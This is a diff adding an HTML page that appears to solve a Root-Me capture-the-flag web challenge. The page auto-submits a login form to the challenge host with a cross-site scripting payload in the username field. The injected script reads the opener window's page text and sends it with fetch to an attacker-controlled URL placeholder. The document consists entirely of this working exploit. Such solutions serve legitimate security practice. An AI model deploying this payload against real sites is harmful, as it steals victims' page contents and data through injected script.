@@ -1,0 +1,17 @@
+<body>
+    <form method="POST" action="http://challenge01.root-me.org:58003/login" target="_blank" id=f>
+        <input id="username" name="username"></input><br>
+        <input id="secret" name="secret"></input><br>
+    </form>
+    <script>
+        payload = `
+        <script>
+            let flag = window.opener.document.body.innerText;
+            let encodedFlag = encodeURIComponent(flag);
+            fetch('<%= OUR_URL %>/flag?flag=' + encodedFlag);
+        \x3C/script>
+        `
+        f.username.value = payload;
+        f.submit();
+    </script>
+</body>
